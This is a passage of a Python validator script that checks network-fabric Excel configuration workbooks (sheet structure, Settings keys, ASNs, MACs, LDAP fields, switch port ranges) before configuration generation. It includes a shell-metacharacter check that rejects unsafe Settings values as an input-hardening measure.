#!/usr/bin/env python3
# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: MIT
"""
Validate an ERA Excel configuration file before import/generate.

Checks sheet structure, required fields, IP/subnet formats, VLAN integrity,
duplicate ports, and cross-sheet consistency. Reports all issues found
rather than stopping at the first error.

Usage:
    python3 scripts/validate_excel.py input/2-8-5-200/default/2-8-5-200.xlsx
    python3 scripts/validate_excel.py /path/to/any-config.xlsx
    make validate-excel EXCEL=input/2-8-5-200/default/2-8-5-200.xlsx
"""

import argparse
import ipaddress
import re
import sys
from collections import Counter, defaultdict
from pathlib import Path

import openpyxl

# Re-use the parser's canonical-role helpers so the validator and parser
# share one source of truth for category resolution.
from excel_parser import (CANONICAL_ROLES, canonical_category, _oob_switch_svi_ip,
                          _parse_cidr,
                          build_wiremap_column_map, parse_air_settings,
                          resolve_oob_vlans, classify_host_role,
                          PLANE_LOOPBACK_BLOCKS,
                          _dataplane_host_ips, _svi_switch_ip, _svi_gateway_ip)
import asn_allocation as asn_alloc
from utils import SWP_PORT_RE, loopbacks_sheet_name
from oob_reserved import (OOB_SUBNET, DEFAULT_AIR_MGMT_SUBNET,
                          AIR_MGMT_RESERVED_OWNERS,
                          find_oob_collisions, air_mgmt_intruders,
                          oob_reserved_for_mode)

# The generator models live in the sibling `data-models/` tree in the internal
# monorepo (net-configurator/ is the public subtree). Add it to sys.path so the
# validator can consult the models. In the public distribution `data-models/` is
# absent, so the import below falls back to the standalone path.
_data_models_dir = Path(__file__).resolve().parents[2] / "data-models"
if _data_models_dir.is_dir():
    sys.path.insert(0, str(_data_models_dir))

try:
    from models import ModelError, load_arch_model
except ImportError:  # pragma: no cover - keeps standalone legacy paths working
    ModelError = ValueError
    load_arch_model = None

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

VALID_ARCHS = ("2-4-3-200", "2-4-5-400", "2-4-5-800", "2-8-5-200", "2-8-9-400", "2-8-9-800", "2-8-9-400-SP")

# Per-arch enforcement mode for the canonical-role allow-list
# (docs/ROLES.md migration plan, step 3). When the Function / System Role
# cell holds a value that ISN'T in CANONICAL_ROLES:
#   strict -> error    (refuse to validate)
#   warn   -> warning  (legacy archs migrate at their own pace)
ROLE_ENFORCEMENT = {
    '2-4-3-200': 'warn',
    '2-4-5-800': 'strict',
    '2-8-5-200': 'warn',
    '2-8-9-400': 'warn',
    '2-8-9-800': 'strict',
    '2-8-9-400-SP': 'strict',  # derived from 2-8-9-800 (clean start) → strict like its parent
}

# Function values that are arch-specific. A canonical role may still be
# meaningless on a given arch — e.g. `csl` only exists in dual-plane
# (2-8-9-800); `ext-storage` only has CSL templates emitting BGP toward
# it. Validator errors when an operator picks an arch-incorrect role
# (silent misconfig otherwise — sessions stay Idle, role inert).
#
# Format: {function: {set of archs where this role IS valid}}
ARCH_RESTRICTED_FUNCTIONS = {
    'core':             frozenset({'2-4-3-200', '2-4-5-800', '2-8-5-200', '2-8-9-400'}),
    'csl':              frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
    'cs':               frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
    'gsl':              frozenset({'2-8-9-800', '2-8-9-400-SP'}),  # bare form, legacy
    'gsl-plane1':       frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
    'gsl-plane2':       frozenset({'2-4-5-800', '2-8-9-800'}),
    'gs-plane1':        frozenset({'2-4-5-800', '2-8-5-200', '2-8-9-400', '2-8-9-800', '2-8-9-400-SP'}),
    'gs-plane2':        frozenset({'2-4-5-800', '2-8-9-800'}),
    'ext-storage':      frozenset({'2-8-9-800', '2-8-9-400-SP'}),
}

# 2-4-5-400 is a DEPOPULATED 2-8-5-200 (ERA-00004-001 v04): same chassis, same
# five adapters, half the GPUs, and — in the doc's own words — "the network
# pattern remains the same". So it peers with exactly the switch roles
# 2-8-5-200 peers with. Mirrored rather than hand-listed: five separate entries
# would be five chances to disagree, and the whole point is that they cannot.
ARCH_RESTRICTED_FUNCTIONS = {
    func: (archs | {'2-4-5-400'}) if '2-8-5-200' in archs else archs
    for func, archs in ARCH_RESTRICTED_FUNCTIONS.items()
}

# Categories that count as "switch" for mgmt-IP-required checks etc.
_SWITCH_CATEGORIES = frozenset({
    'core', 'csl', 'cs', 'cl', 'gsl', 'gsl-plane1', 'gsl-plane2',
    'gl-plane1', 'gl-plane2', 'gs-plane1', 'gs-plane2',
    'oob-switch', 'edge', 'air-oob',
})

# Devices whose mgmt IP is legitimately OUTSIDE every OOB VLAN subnet, and so
# are exempt from the reachability check in check_vlan_oob_mapping (ERA-61):
#
#   edge     — cust-net-edge-*, a customer-owned upstream device. Not ours to
#              address, and not on our OOB plane.
#   air-oob  — an Air virtual node; it belongs on air_mgmt_subnet, which has
#              its own overlap-vs-OOB check elsewhere in this file.
#
# Deliberately NOT _SWITCH_CATEGORIES. That set is shared by three unrelated
# call sites that want different membership, and reusing it here excluded every
# ERA-managed fabric switch — whose eth0 lands on the OOB plane and is exactly
# what the check exists to validate.
_OOB_SUBNET_EXEMPT_CATEGORIES = frozenset({'edge', 'air-oob'})

# Categories that satisfy the "have at least one compute/N-S leaf" check:
# core (converged collapsed), csl (dedicated 1-tier combined leaf+spine), or
# cl (dedicated 2-tier leaf). All three terminate the compute/N-S fabric.
_CONVERGED_LEAF_CATEGORIES = frozenset({'core', 'csl', 'cl'})

REQUIRED_SHEETS = ["Settings", "Nodes", "VLANs & Profiles"]

REQUIRED_SETTINGS_KEYS = [
    "architecture",
    # bgp_asn is no longer required in Settings: per-node ASNs live
    # in the Loopbacks ASN column. A cross-check below requires an ASN *source*
    # (Settings.bgp_asn OR a populated Loopbacks ASN column).
    "loopback_base",
]

OPTIONAL_SETTINGS_KEYS = [
    # bgp_asn is optional: removed from shipped workbooks in favor of
    # the Loopbacks ASN column, but still recognized for older customer inputs.
    "bgp_asn",
    "mgmt_subnets",
    "management_switches",
    "site_name",
    "deploy_in_air",
    "tiers",
    "ns_tiers",
    "ew_tiers",
    "convergence",
    "disabled_ports",
    "ldap_enabled",
    "ldap_domain",
    "ldap_base_dn",
    "ldap_root_dn",
    "ldap_servers",
    "ldap_organization",
    "timezone",
    "mh_mac",
    "anycast_mac",
    "ztp_server",
    "ntp_servers",
    "num_physical_ports",
    "status_page_enabled",
    "air_mgmt_subnet",
    "gpu_vlan_mode",
    "oob_uplink_mode",
    "gpu_planes",
    "ldap_organization",
    "pre_login_message",
    "post_login_message",
]

# R4-06: keys that are accepted by historical templates but have ZERO
# downstream consumers in the current pipeline. We warn rather than
# silently accept so operators don't think "I set X, it should work."
DEAD_SETTINGS_KEYS = {
    "exit_dhcp_servers": "no consumer in the current pipeline (was used by test scaffolding only); EXIT VRF DHCP is driven by the DHCP Relay table now",
    "telemetry_enabled": "no consumer in the current pipeline; switch telemetry is currently always-on via the per-arch `telemetry` block in inventory_defaults.yml",
    "netq_ip":           "no consumer in the current pipeline — there is no NetQ agent configuration anywhere in the tool",
    "ztp_enabled":       "no consumer in the current pipeline; ZTP is opt-in by which target you run (`make ztp-setup` / `make switch-ztp-deploy`), not by a Settings flag",
    "scalable_units":    "no consumer in the current pipeline; SU count is derived from the Nodes sheet (`su-<N>-node-<M>`)",
    "nodes_per_su":      "no consumer in the current pipeline; nodes-per-SU is derived from the Nodes sheet (`su-<N>-node-<M>`)",
    "air_username":      "Air credentials come from the .era-secrets vault (run `make air-setup`), not the Excel Settings sheet",
    "air_org":           "no consumer in the current pipeline",
}

# Node columns (1-based)
NODE_COL_FUNCTION = 1
NODE_COL_NAME = 2
NODE_COL_MAC = 3
NODE_COL_MGMT_IP = 4
NODE_COL_PREFIX = 5
NODE_COL_GATEWAY = 6

# NOTE: the Wire Map / Air_Only sheets are read by *header name*, not fixed
# column index — see the header-lookup helpers (tests/test_wiremap_header_lookup.py).
# A block of WM_COL_* / AIR_COL_* index constants used to live here describing a
# 13-column layout; the shipped sheets are a 10-column A/B layout
# ("System Name (A) | Port (A) | … | System Name (B) | Port (B) | … | Network Profile")
# and nothing referenced the constants. Removed rather than left to mislead.

MAC_RE = re.compile(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')
PORT_RE = re.compile(r'^(swp\d+([s]\d+)?|eth\d+|enp\d+s\d+f\d+(np\d+)?)$')
# The canonical switch-port grammar (SWP_PORT_RE) is imported at the top of
# this file from utils.py, where it is defined once so the validator and the
# topology generator cannot drift apart again (ERA-96).

# SEC (scan finding #1): Settings scalars that get rendered *unquoted* into a
# root-executed shell — NVUE config scripts (`nv set system ntp server X`,
# `... date-time timezone X`, `... aaa ldap base-dn X`) and the slapd debconf
# preseed. Each has a narrow legitimate charset (hostnames, IPs, LDAP DNs,
# timezone names); none need shell metacharacters. We reject those at the
# import gate so a hostile workbook can't inject commands, independent of any
# template-level quoting.
SHELL_INJECTION_PRONE_KEYS = (
    "ntp_servers",
    "timezone",
    "ldap_base_dn",
    "ldap_root_dn",
    "ldap_domain",
    "ldap_servers",
    # site_name is substituted into the {site} login-banner placeholder, which
    # is rendered into a root-executed switch config. Reject shell metacharacters
    # so a quote/`;`/`$` can't break out of the banner argument (security review #16).
    "site_name",
)
# Shell metacharacters + any ASCII control char. Deliberately allows the chars
# these structured fields legitimately use: alnum, space, . - _ / = , + : @
_SHELL_META_RE = re.compile(r"""[`$;|&<>(){}\[\]\\!*?~'"]|[\x00-\x1f\x7f]""")
_MAX_SETTINGS_SCALAR_LEN = 255


# Type column (optional, new in 2026-05-28 schema) — distinguishes switches
# from server/compute nodes for at-a-glance clarity on the Nodes tab. The
# Type column is OPTIONAL — older Excels without it still validate.
_VALID_TYPES = frozenset({'switch', 'node'})

# Function values that imply Type=switch (Cumulus VX). When the Type
# column is present, Function/Type consistency is enforced.
_SWITCH_FUNCTIONS = frozenset({
    'core', 'csl', 'gsl', 'gsl-plane1', 'gsl-plane2',
    'oob-switch', 'edge', 'air-oob',
})

# Function values that imply Type=node (Ubuntu / Cumulus host).
# Any numbered customer edge is a legitimate Air-only switch: the count is
# derived from the fabric's EXIT uplink load, not pinned, so the validator
# cannot carry a fixed list of names without failing every workbook that
# scales past the historical HA pair.
_CUST_NET_EDGE_RE = re.compile(r'^cust-net-edge-\d{2,}$')

_NODE_FUNCTIONS = frozenset({
    'gpu', 'support', 'storage', 'ext-storage',
    'dhcp', 'oob-server',
})

# Air-only documentary nodes (Enabled=Air state). These names ARE the
# auto-injected Air infrastructure; the operator's Nodes-tab row exists
# purely so they show up in the spreadsheet for awareness, not to drive
# provisioning. Validator enforces Name + Type consistency for these.
_KNOWN_AIR_NODES = {
    # L3 OOB mode (current default for all 4 archs). Only -01/-02 are listed
    # by name; the fabric fans its EXIT uplinks out over as many edges as the
    # scale needs (four at SU32 -- see cust_edge_count() in
    # generate_arch_excel.py), so the rest are matched by the pattern below.
    'cust-net-edge-01': 'switch',
    'cust-net-edge-02': 'switch',
    'external-conn':    'node',
    'external-dhcp':    'node',
    'utility':          'node',
    'ext-storage-01':   'node',
    'ext-storage-02':   'node',
    # L2 OOB mode (legacy — kept for operators who switch oob_uplink_mode)
    'dhcp-oob':         'node',
    'oob-server-01':    'node',
    'dhcp-edge':        'node',
    'air-oob-switch':   'switch',
}


# ---------------------------------------------------------------------------
# Result collector
# ---------------------------------------------------------------------------

class ValidationResult:
    """Collects errors and warnings across all checks."""

    def __init__(self):
        self.errors = []
        self.warnings = []

    def error(self, sheet, msg):
        self.errors.append(f"[{sheet}] {msg}")

    def warn(self, sheet, msg):
        self.warnings.append(f"[{sheet}] {msg}")

    @property
    def ok(self):
        return len(self.errors) == 0

    def summary(self):
        lines = []
        if self.errors:
            lines.append(f"\n{'='*60}")
            lines.append(f"ERRORS ({len(self.errors)})")
            lines.append(f"{'='*60}")
            for e in self.errors:
                lines.append(f"  ❌  {e}")
        if self.warnings:
            lines.append(f"\n{'='*60}")
            lines.append(f"WARNINGS ({len(self.warnings)})")
            lines.append(f"{'='*60}")
            for w in self.warnings:
                lines.append(f"  ⚠️  {w}")
        if self.ok and not self.warnings:
            lines.append("\n✅  All checks passed — Excel is valid.")
        elif self.ok:
            lines.append(f"\n✅  No errors found ({len(self.warnings)} warnings).")
        else:
            lines.append(f"\n❌  Validation failed: {len(self.errors)} error(s), {len(self.warnings)} warning(s).")
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _cell(ws, row, col):
    """Get cell value, stripping strings.

    `col=None` means "column not present in this sheet"; returns None
    rather than raising — lets optional-column code paths skip cleanly.
    """
    if col is None:
        return None
    v = ws.cell(row=row, column=col).value
    if isinstance(v, str):
        return v.strip()
    return v


def _parse_swp_port(value):
    match = SWP_PORT_RE.match(str(value or '').strip())
    if not match:
        return None
    parent = int(match.group(1))
    subport = int(match.group(2)) if match.group(2) is not None else None
    return parent, subport


def _endpoint_category(name, role_hint, nodes_function_map):
    name_str = str(name or '').strip()
    role_str = str(role_hint or '').strip()
    if name_str and nodes_function_map and name_str in nodes_function_map:
        return nodes_function_map[name_str]

    category = canonical_category(role_str, name_str or None)
    if category:
        return category

    lowered = name_str.lower()
    if lowered.startswith('cust-net-edge-'):
        return 'edge'
    if lowered.startswith('ext-'):
        return 'storage'
    return None


def _hardware_role_for_endpoint(function, peer_function, profile):
    profile_lc = str(profile or '').strip().lower()
    if not function or not profile_lc:
        return None

    if function == 'oob-switch':
        if profile_lc == 'oob':
            return 'oob_access'
        if profile_lc == 'oob uplink':
            return 'oob_uplink'
        return None

    if profile_lc == 'cpu/in-band network':
        return 'support' if peer_function == 'support' else 'cpu_inband'
    if profile_lc == 'gpu network':
        return 'gpu'
    if profile_lc == 'storage':
        return 'storage'
    if profile_lc == 'edge uplink':
        return 'common_exit'
    if profile_lc == 'oob uplink':
        return 'oob'
    if profile_lc in ('isl', 'n/s leaf peer'):
        return 'isl'
    return None


def validate_switch_hardware_ports(wb, settings, nodes_function_map, result):
    """Validate switch ports against public SN5600/SN2201 hardware limits."""
    if 'Wire Map' not in wb.sheetnames:
        return

    ws = wb['Wire Map']
    try:
        col_map = build_wiremap_column_map(ws, sheet_kind='wiremap')
    except ValueError:
        return

    columns = {
        'system_role': col_map.get('system_role'),
        'system_name': col_map.get('system_name'),
        'nic_port': col_map.get('nic_port'),
        'switch_role': col_map.get('switch_role'),
        'switch_name': col_map.get('switch_name'),
        'switch_port': col_map.get('switch_port'),
        'network_profile': col_map.get('network_profile'),
    }
    required = ('system_name', 'nic_port', 'switch_name', 'switch_port', 'network_profile')
    if any(columns.get(name) is None for name in required):
        return

    for row in range(2, ws.max_row + 1):
        profile = _cell(ws, row, columns['network_profile'])
        a_name = _cell(ws, row, columns['system_name'])
        a_role = _cell(ws, row, columns['system_role'])
        a_port = _cell(ws, row, columns['nic_port'])
        b_name = _cell(ws, row, columns['switch_name'])
        b_role = _cell(ws, row, columns['switch_role'])
        b_port = _cell(ws, row, columns['switch_port'])

        a_function = _endpoint_category(a_name, a_role, nodes_function_map)
        b_function = _endpoint_category(b_name, b_role, nodes_function_map)

        endpoints = (
            (a_name, a_port, a_function, b_function),
            (b_name, b_port, b_function, a_function),
        )
        for name, port, function, peer_function in endpoints:
            if not name or not port or function is None:
                continue
            role = _hardware_role_for_endpoint(function, peer_function, profile)
            parsed = _parse_swp_port(port)
            if role is None or parsed is None:
                continue

            port_str = str(port).strip()
            parent, subport = parsed
            if function == 'oob-switch':
                if role == 'oob_access':
                    valid = 1 <= parent <= 48 and subport is None
                    expected = 'SN2201 copper swp1-swp48 without subports'
                elif role == 'oob_uplink':
                    valid = 49 <= parent <= 52 and subport is None
                    expected = 'SN2201 uplink swp49-swp52'
                else:
                    continue
            else:
                valid = 1 <= parent <= 64 and (subport is None or 0 <= subport <= 7)
                expected = 'SN5600 fabric swp1-swp64 with subports s0-s7'

            if not valid:
                result.error(
                    'Switch hardware',
                    f"Wire Map row {row}: {name} ({function}) uses {port_str} "
                    f"for profile '{profile}' role '{role}', but hardware allows "
                    f"{expected}."
                )


def _is_valid_ip(ip_str):
    """Check if string is a valid IPv4 address."""
    try:
        ipaddress.IPv4Address(ip_str)
        return True
    except (ValueError, ipaddress.AddressValueError):
        return False


def _is_valid_cidr(cidr_str):
    """Check if string is a valid IPv4 network in CIDR notation."""
    try:
        ipaddress.IPv4Network(cidr_str, strict=False)
        return True
    except (ValueError, ipaddress.AddressValueError):
        return False


# ---------------------------------------------------------------------------
# Sheet-level validators
# ---------------------------------------------------------------------------

def validate_sheets(wb, result):
    """Check that all required sheets exist."""
    for sheet in REQUIRED_SHEETS:
        if sheet not in wb.sheetnames:
            result.error("Workbook", f"Missing required sheet: '{sheet}'")

    if 'Wire Map' not in wb.sheetnames:
        result.warn("Workbook", "Missing 'Wire Map' sheet — topology and port config will not be generated.")

    if 'Air_Only' not in wb.sheetnames:
        result.warn("Workbook", "Missing 'Air_Only' sheet — Air virtual nodes will not be detected.")


def validate_settings(ws, result):
    """Validate Settings sheet keys and value formats."""
    settings = {}
    # S3: detect duplicate Settings keys — parser silently last-wins.
    seen_keys = {}
    # R4-06: track whether we're inside the VERSIONS sub-section. Those
    # rows pair `switch_function` → `cumulus_version` and are parsed
    # separately by parse_versions(); they aren't Settings keys.
    in_versions = False
    for row in range(1, ws.max_row + 1):
        key = _cell(ws, row, 1)
        val = _cell(ws, row, 2)
        if key is None:
            in_versions = False  # blank row closes the section
            continue
        key_lower = str(key).strip().lower().replace(' ', '_').replace('-', '_')
        # Section-header tracking: 'versions' opens the sub-section; any
        # other ALL-CAPS-section header closes it.
        if key_lower == 'versions':
            in_versions = True
            continue
        if key_lower in ('general', 'air_deployment', 'network', 'management',
                          'telemetry', 'advanced'):
            in_versions = False
            continue
        # Column headers
        if key_lower in ('setting', 'value', 'switch_function'):
            continue
        if in_versions:
            continue  # skip rows inside the VERSIONS table
        if key_lower in seen_keys:
            result.error("Settings",
                         f"Row {row}: duplicate key '{key_lower}' (also on row "
                         f"{seen_keys[key_lower]}). Parser silently uses the "
                         f"last value; one of the two is ignored.")
        seen_keys[key_lower] = row
        settings[key_lower] = val

    # Required keys
    for k in REQUIRED_SETTINGS_KEYS:
        if k not in settings or settings[k] is None or str(settings[k]).strip() == '':
            result.error("Settings", f"Missing required key: '{k}'")

    # Architecture
    arch = str(settings.get('architecture', '')).strip()
    if arch and arch not in VALID_ARCHS:
        result.error("Settings", f"Invalid architecture: '{arch}' (valid: {', '.join(VALID_ARCHS)})")

    # mgmt_subnets: retired. It remains an OPTIONAL settings key
    # (see OPTIONAL_SETTINGS_KEYS) purely so its presence triggers this
    # specific migration error rather than a generic "unknown key" warning.
    if settings.get('mgmt_subnets') not in (None, ''):
        result.error("Settings",
                     "mgmt_subnets is no longer supported. Declare the "
                     "OOB subnet on the OOB VLAN row in 'VLANs & Profiles' (VRF "
                     "OOB) and set each OOB switch's 'OOB VLAN' column on the Nodes "
                     "tab.")

    # S9: air_mgmt_subnet must not overlap the OOB VLAN subnet(s). NOTE:
    # air_mgmt_subnet is authored on the Air_Only sheet, not Settings, so this
    # overlap check runs in validate_excel() (via _validate_air_mgmt_overlap)
    # once the Air_Only value and the Nodes/VLANs sheets have been resolved —
    # not here, where settings has no air_mgmt_subnet yet.

    # management_switches — retired. The OOB switch
    # count is derived from the Active oob-switch rows on the Nodes tab, not
    # from a Settings integer. A stale present value is ignored (not an
    # error) — just a soft WARN so authors know it no longer does anything.
    if settings.get('management_switches') not in (None, ''):
        result.warn("Settings",
                     "management_switches is ignored — the OOB switch count "
                     "is derived from the oob-switch rows on the Nodes tab.")

    # bgp_asn — must be a valid ASN: positive integer, ≤ 2^32-1 (4-byte
    # max), not the reserved 0 or 23456. Reject floats outright (silent
    # truncation), reject >2^32-1 (overflow).
    asn = settings.get('bgp_asn')
    if asn is not None:
        if isinstance(asn, float) and not asn.is_integer():
            result.error("Settings",
                         f"bgp_asn must be an integer, got float {asn} "
                         f"(silent truncation hides the typo).")
        else:
            try:
                asn_int = int(asn)
                if asn_int < 1:
                    result.error("Settings", f"bgp_asn must be positive, got {asn_int}")
                elif asn_int > 0xFFFFFFFF:
                    result.error("Settings",
                                 f"bgp_asn = {asn_int} exceeds 2^32-1 "
                                 f"({0xFFFFFFFF}); 4-byte ASN max is exceeded.")
                elif asn_int == 23456:
                    result.error("Settings",
                                 "bgp_asn = 23456 is reserved by RFC 4893 for "
                                 "4-byte ASN transition. Choose another.")
            except (TypeError, ValueError):
                result.error("Settings", f"bgp_asn must be an integer, got '{asn}'")

    # loopback_base — first 3 octets of IP
    lb = settings.get('loopback_base')
    if lb:
        lb_str = str(lb).strip()
        if not _is_valid_ip(f"{lb_str}.1"):
            result.error("Settings", f"Invalid loopback_base: '{lb_str}' (expected first 3 octets, e.g. '172.16.176')")

    # disabled_ports — CSV of integers in 1-64 range (no Cumulus model in
    # this lineup has > 64 base ports; port 0 doesn't exist).
    dp = settings.get('disabled_ports')
    if dp:
        for part in str(dp).split(','):
            part = part.strip()
            if part:
                try:
                    p = int(part)
                    if p < 1 or p > 64:
                        result.error("Settings",
                                     f"disabled_ports entry {p} out of range "
                                     f"(must be 1-64; port 0 doesn't exist, ports "
                                     f"> 64 aren't on any Cumulus model in this lineup).")
                except ValueError:
                    result.error("Settings", f"Invalid port number in disabled_ports: '{part}'")

    # ztp_server — valid IP
    ztp = settings.get('ztp_server')
    if ztp and str(ztp).strip():
        if not _is_valid_ip(str(ztp).strip()):
            result.error("Settings", f"Invalid ztp_server IP: '{ztp}'")

    # MAC addresses — format check + reject broadcast/multicast/all-zero
    # (these would brick EVPN MH at apply time).
    mac_values = {}
    for key in ('mh_mac', 'anycast_mac'):
        mac = settings.get(key)
        if mac and str(mac).strip():
            mac_str = str(mac).strip()
            if not MAC_RE.match(mac_str):
                result.error("Settings", f"Invalid MAC format for {key}: '{mac}'")
                continue
            mac_values[key] = mac_str
            # Normalize for value checks
            mac_hex = mac_str.replace(':', '').replace('-', '').lower()
            if mac_hex == '0' * 12:
                result.error("Settings",
                             f"{key} is all-zero ({mac_str}) — invalid MAC; "
                             f"will brick EVPN MH config.")
            elif mac_hex == 'f' * 12:
                result.error("Settings",
                             f"{key} is broadcast (ff:ff:ff:ff:ff:ff) — invalid "
                             f"MAC; will brick EVPN MH config.")
            elif int(mac_hex[1], 16) & 1:  # multicast bit in first octet
                result.error("Settings",
                             f"{key} '{mac_str}' is a multicast MAC (first "
                             f"octet's LSB is 1). EVPN MH requires a unicast MAC.")

    # ldap_servers — CSV of IPs
    ldap_servers = settings.get('ldap_servers')
    if ldap_servers and str(ldap_servers).strip():
        for part in str(ldap_servers).split(','):
            part = part.strip()
            if part and not _is_valid_ip(part):
                result.error("Settings", f"Invalid IP in ldap_servers: '{part}'")

    # R3-5: if ldap_enabled, require populated ldap fields. Operators
    # have shipped configs with ldap_enabled=Yes but blank ldap_servers /
    # base_dn / root_dn — switch boots LDAP-broken and template emits
    # MISSING_X_SET_IN_EXCEL literals into NVUE config.
    ldap_enabled = str(settings.get('ldap_enabled', '') or '').strip().lower()
    if ldap_enabled in ('yes', 'true', '1'):
        for required in ('ldap_servers', 'ldap_base_dn', 'ldap_root_dn'):
            val = settings.get(required)
            if val is None or not str(val).strip():
                result.error("Settings",
                             f"ldap_enabled=Yes but '{required}' is empty. "
                             f"LDAP config will ship to switches with broken/"
                             f"placeholder values. Either fill in '{required}' "
                             f"or set ldap_enabled=No.")

    # R3-4: mh_mac and anycast_mac must not collide. The same MAC value
    # used as EVPN ES segment system MAC AND gateway anycast MAC creates
    # ambiguity in the EVPN control plane.
    if (mac_values.get('mh_mac') and mac_values.get('anycast_mac')
            and mac_values['mh_mac'].lower() == mac_values['anycast_mac'].lower()):
        result.error("Settings",
                     f"mh_mac and anycast_mac are both set to "
                     f"'{mac_values['mh_mac']}'. These must be distinct: "
                     f"mh_mac is the EVPN MH system-id MAC, anycast_mac is "
                     f"the gateway VRR MAC. Same value collides at apply time.")

    # exit_dhcp_servers — CSV of IPs
    exit_dhcp = settings.get('exit_dhcp_servers')
    if exit_dhcp and str(exit_dhcp).strip():
        for part in str(exit_dhcp).split(','):
            part = part.strip()
            if part and not _is_valid_ip(part):
                result.error("Settings", f"Invalid IP in exit_dhcp_servers: '{part}'")

    # gpu_vlan_mode — allowed values
    valid_gpu_modes = {'single', 'per_rail', 'per_rail_per_plane'}
    gpu_mode = settings.get('gpu_vlan_mode')
    if gpu_mode is not None and str(gpu_mode).strip():
        mode_val = str(gpu_mode).strip().lower()
        if mode_val not in valid_gpu_modes:
            result.error("Settings",
                         f"Invalid gpu_vlan_mode: '{gpu_mode}'. "
                         f"Allowed: {', '.join(sorted(valid_gpu_modes))}.")

    # Deprecated: vlan_per_gpu was renamed to gpu_vlan_mode. Hard-fail with
    # a clear migration message so operators copying from stale templates
    # don't get silent no-ops.
    if 'vlan_per_gpu' in settings:
        result.error("Settings",
                     "Setting 'vlan_per_gpu' was renamed to 'gpu_vlan_mode'. "
                     "Replace the row name and change the value: "
                     "'No' -> 'single', 'Yes' -> 'per_rail'. "
                     "New value 'per_rail_per_plane' is also available. "
                     "See docs/plans/2026-05-18-gpu-plane-per-rail.md.")

    # oob_uplink_mode — allowed values
    valid_oob_modes = {'l2', 'l3'}
    oob_mode = settings.get('oob_uplink_mode')
    if oob_mode is not None and str(oob_mode).strip():
        mode_val = str(oob_mode).strip().lower()
        if mode_val not in valid_oob_modes:
            result.error("Settings",
                         f"Invalid oob_uplink_mode: '{oob_mode}'. "
                         f"Allowed (case-insensitive): {', '.join(sorted(valid_oob_modes))}.")


    # R4-09: boolean Settings keys should be Yes/No (or yes/no, true/false).
    # Python True/False booleans typed into the cell are inconsistent —
    # some keys honor them, others silently drop. Warn so operators
    # standardize on Yes/No strings.
    _BOOL_KEYS = ('deploy_in_air', 'ldap_enabled', 'ztp_enabled',
                   'status_page_enabled', 'telemetry_enabled')
    _BOOL_OK = {'yes', 'no', 'true', 'false', '1', '0'}
    for k in _BOOL_KEYS:
        v = settings.get(k)
        if v is None or v == '':
            continue
        if isinstance(v, bool):
            result.warn("Settings",
                        f"'{k}' is a native Python boolean ({v}); the parser "
                        f"handles some boolean keys differently when typed as "
                        f"True/False vs 'Yes'/'No'. Use 'Yes' or 'No' for "
                        f"consistency.")
            continue
        if str(v).strip().lower() not in _BOOL_OK:
            result.error("Settings",
                         f"'{k}' must be Yes/No (or yes/no/true/false), "
                         f"got {v!r}.")

    # R4-07: type strictness on integer-valued Settings keys. Without this,
    # `tiers='1'` (text-formatted cell) propagates as a string into
    # group_vars/all/main.yml; downstream Jinja `{% if tiers > 1 %}`
    # compares string-vs-int and is silently wrong.
    for k in ('tiers', 'ns_tiers', 'ew_tiers',
              'num_physical_ports', 'gpu_planes'):
        v = settings.get(k)
        if v is None or v == '':
            continue
        # bool is a subclass of int — exclude.
        if isinstance(v, bool):
            result.error("Settings",
                         f"'{k}' must be a positive integer, got {v!r} "
                         f"(Yes/No is for boolean keys; this key takes a number).")
            continue
        if isinstance(v, int):
            if v <= 0:
                result.error("Settings", f"'{k}' must be positive, got {v}.")
            continue
        # float ok if it's whole-number-valued
        if isinstance(v, float):
            if v <= 0 or v != int(v):
                result.error("Settings",
                             f"'{k}' must be a positive integer, got {v} "
                             f"(non-integer float).")
            continue
        # str — operator typed text into a numeric cell
        try:
            iv = int(str(v).strip())
            if iv <= 0:
                result.error("Settings", f"'{k}' must be positive, got {iv}.")
            else:
                result.warn("Settings",
                            f"'{k}' is text-formatted ('{v}'); change the cell "
                            f"format to Number so downstream Jinja comparisons "
                            f"don't silently compare string-vs-int.")
        except (TypeError, ValueError):
            result.error("Settings",
                         f"'{k}' must be a positive integer, got {v!r}.")

    # R4-06: warn on documented-but-not-implemented Settings keys.
    for dead_key, why in DEAD_SETTINGS_KEYS.items():
        if dead_key in settings and settings[dead_key] not in (None, ''):
            result.warn("Settings",
                        f"'{dead_key}' is set but has no effect — {why}. "
                        f"Remove the row to silence this warning.")

    # Pre/post-login messages — soft sanity check for control characters
    # other than newline + tab. NVUE accepts most printable text including
    # Unicode, but raw control chars (e.g. \r, \x07, \x1b) break the
    # rendered .sh shell quoting or display oddly on the switch. Warn
    # rather than error — operator may have legitimate exotic content.
    for banner_key in ("pre_login_message", "post_login_message"):
        val = settings.get(banner_key)
        if not val:
            continue
        bad = [c for c in str(val)
               if ord(c) < 32 and c not in ('\n', '\t')]
        if bad:
            result.warn(
                "Settings",
                f"'{banner_key}' contains {len(bad)} ASCII control "
                f"character(s) other than newline/tab — these may render "
                f"oddly in the NVUE banner or break shell quoting. "
                f"Strip them if the banner displays wrong on the switch."
            )

    # R4-08: scan for formula cells that evaluated to None under
    # data_only=True (formula cell with no cached value — happens when an
    # openpyxl-written workbook is loaded before Excel/LibreOffice has
    # computed the cell). Operator's intent silently vanishes.
    for row in range(1, ws.max_row + 1):
        for col in (1, 2):
            cell = ws.cell(row=row, column=col)
            if cell.data_type == 'f' and cell.value in (None, ''):
                result.warn("Settings",
                            f"Row {row} col {col}: cell contains a formula "
                            f"('{cell.value}') with no cached value. Open the "
                            f"workbook in Excel/LibreOffice, recompute, save, "
                            f"and re-run — or replace with a literal.")

    # R4-06 / R4-19 / R3-9: warn on Settings keys that don't appear in
    # REQUIRED + OPTIONAL + DEAD lists. Catches typos like `nodes_per_us`.
    all_known_keys = (set(REQUIRED_SETTINGS_KEYS)
                       | set(OPTIONAL_SETTINGS_KEYS)
                       | set(DEAD_SETTINGS_KEYS.keys())
                       | {'architecture', 'vlan_per_gpu'})  # vlan_per_gpu already errored above
